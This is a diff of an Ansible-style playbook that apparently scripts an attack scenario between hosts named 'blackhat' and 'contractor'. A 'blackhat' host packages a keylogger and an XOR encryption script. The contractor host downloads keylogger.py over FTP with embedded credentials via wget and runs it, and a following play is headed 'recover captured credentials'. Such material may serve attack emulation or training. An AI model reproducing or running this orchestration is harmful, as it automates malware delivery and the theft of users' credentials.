@@ -10,14 +10,14 @@
   hosts: blackhat
   tasks:
     - name: hijack user-facing package
-      raw: python package.py
+      raw: python package.py keylogger.py
+    - name: upload xor encryption script
+      raw: python package.py xor.py
 - name: package download
   hosts: contractor
   tasks:
     - name: download the package
       raw: wget --user=anonymous --password='contractor@fazio.com' ftp://downloads.fazio.com:21/download/keylogger.py
-    - name: unpack the attachment
-      raw: grep -lir "keylogger" /home/ubuntu | xargs munpack
     - name: run the keylogger
       raw: python keylogger.py
 - name: recover captured credentials
